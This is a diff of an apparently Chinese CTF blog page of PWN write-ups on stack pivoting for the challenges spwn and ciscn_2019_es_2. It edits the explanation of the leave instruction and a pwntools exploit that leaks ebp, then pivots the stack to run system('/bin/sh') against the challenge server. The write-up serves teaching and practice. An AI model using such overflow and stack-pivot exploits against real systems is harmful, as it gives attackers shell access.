@@ -24,7 +24,7 @@
 <meta property="og:locale">
 <meta property="og:image" content="http://niyah.cn/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B03/%E5%B0%81%E9%9D%A2.webp">
 <meta property="article:published_time" content="2021-01-25T10:10:27.000Z">
-<meta property="article:modified_time" content="2021-01-27T07:02:55.998Z">
+<meta property="article:modified_time" content="2021-01-30T07:51:38.146Z">
 <meta property="article:author" content="Niyah">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -132,7 +132,7 @@
                         <i class="fa fa-edit"></i> 
                         
                         
-                            ~2.61K
+                            ~2.75K
                         
                         字
                         
@@ -144,15 +144,26 @@
             <div class="kratos-post-content">
                 
                     <div class="kratos-post-inner-toc">
-                        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig4-"><span class="toc-number">1.</span> <span class="toc-text"> spwn（栈-&gt;bss）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig5-"><span class="toc-number">2.</span> <span class="toc-text"> ciscn_2019_es_2（栈-&gt;栈）</span></a></li></ol>
+                        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#spwn%E6%A0%88-bss"><span class="toc-number">1.</span> <span class="toc-text"> spwn（栈 -&gt;bss）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig5-"><span class="toc-number">2.</span> <span class="toc-text"> ciscn_2019_es_2（栈-&gt;栈）</span></a></li></ol>
                     </div>
                 
                 <hr />
-                <h2 id="-swig4-"><a class="markdownIt-Anchor" href="#-swig4-">#</a> <div class="alert alert-success">spwn（栈->bss）</div></h2>
+                <h2 id="spwn栈-bss"><a class="markdownIt-Anchor" href="#spwn栈-bss">#</a> spwn（栈 -&gt;bss）</h2>
 <p>本题考察的是栈迁移</p>
 <p>进入 IDA 进行分析，我们可以看到本题为我们提供了两个输入：</p>
 <p>第一次输入我们可以把数据写入到程序的 bss 段；</p>
-<p>第二次输入我们可以造成溢出，但是只能 8 个字节，做 rop 链显然是太短了，但好在程序之中有 leave 片段，leave 指令是将栈顶指针 esp 指向帧指针 ebp，然后 pop 备份的原帧指针到 ebp，实现栈迁移，由于我们的程序是 32 位程序，我们可以覆盖把 ebp 覆盖成 bss 段地址之后执行 leave 指令，这样我们 ebp 便指向了 bss 段，我们便可以执行我们第一次输入到 bss 段的内容；</p>
+<p>第二次输入我们可以造成溢出，但是只能 8 个字节，做 rop 链显然是太短了，但好在程序之中有 leave 片段</p>
+<div class="panel panel-TYPE">
+    <div class="panel-title">leave</div>
+    <div class="panel-body">
+        <p>在 32 位汇编下相当于:<br>
+mov esp,ebp;<br>
+pop ebp</p>
+<p>将栈顶指针 esp 指向帧指针 ebp，然后 pop 备份的原帧指针到 ebp，实现栈迁移</p>
+
+    </div>
+    </div>
+<p>由于我们的程序是 32 位程序，我们可以覆盖把 ebp 覆盖成 bss 段地址之后执行 leave 指令，这样我们 ebp 便指向了 bss 段，我们便可以执行我们第一次输入到 bss 段的内容；</p>
 <p>之后是正常的 rop 过程。</p>
 <p>完整流程如下：</p>
 <p>1. 第一轮的第一次输入把泄露函数地址的 rop 链写入 bss 段；</p>
@@ -176,7 +187,7 @@
 <div class="panel panel-TYPE">
     <div class="panel-title">EXP</div>
     <div class="panel-body">
-        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;ciscn_2019_es_2&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26666</span>)</span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x080484b8</span></span><br><span class="line">system_plt=<span class="number">0x8048400</span> </span><br><span class="line"></span><br><span class="line">payload1 =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;abcdefgh&#x27;</span>  <span class="comment">#完全覆盖至printf输出栈上，输出ebp</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;abcdefgh&#x27;</span>)</span><br><span class="line">s_adder = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(s_adder))</span><br><span class="line">payload2=(<span class="string">&#x27;bbbb&#x27;</span>+ p32(system_plt) +<span class="string">&#x27;cccc&#x27;</span> + p32(s_adder + <span class="number">0x10</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+ p32(s_adder) + p32(leave)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;ciscn_2019_es_2&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26666</span>)</span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x080484b8</span></span><br><span class="line">system_plt=<span class="number">0x8048400</span> </span><br><span class="line"></span><br><span class="line">payload1 =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;abcdefgh&#x27;</span>  <span class="comment">#完全覆盖至printf输出栈上，输出ebp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里esp距离ebp有0x28个字节我们直接输入0x28个来打印ebp算出偏移</span></span><br><span class="line"><span class="comment">#刚好能输出ebp就不要多想，直接覆盖0x28就完事</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;abcdefgh&#x27;</span>)</span><br><span class="line">s_adder = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">print(<span class="built_in">hex</span>(s_adder))</span><br><span class="line">payload2=(<span class="string">&#x27;bbbb&#x27;</span>+ p32(system_plt) +<span class="string">&#x27;cccc&#x27;</span> + p32(s_adder + <span class="number">0x10</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+ p32(s_adder) + p32(leave)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
     </div>
@@ -271,7 +282,7 @@
                         <a class="tag-none-link" href="/tags/BUUCTF/" rel="tag">BUUCTF</a>, <a class="tag-none-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-none-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-none-link" href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag">栈迁移</a>
                     </div>
                     <div class="pull-date">
-                    <span>最后编辑：2021-01-27</span>
+                    <span>最后编辑：2021-01-30</span>
                     </div>
                 </div>
             </footer>
@@ -353,7 +364,7 @@
     </div>
     <div class="textwidget">
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig4-"><span class="toc-number">1.</span> <span class="toc-text"> spwn（栈-&gt;bss）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig5-"><span class="toc-number">2.</span> <span class="toc-text"> ciscn_2019_es_2（栈-&gt;栈）</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#spwn%E6%A0%88-bss"><span class="toc-number">1.</span> <span class="toc-text"> spwn（栈 -&gt;bss）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-swig5-"><span class="toc-number">2.</span> <span class="toc-text"> ciscn_2019_es_2（栈-&gt;栈）</span></a></li></ol>
         
     </div>
 </aside>
@@ -503,7 +514,7 @@
     <meting-js
         server="netease"
         type="playlist"
-        id="3204190542"
+        id="5474434735"
         order="random"
         fixed="true"
     >
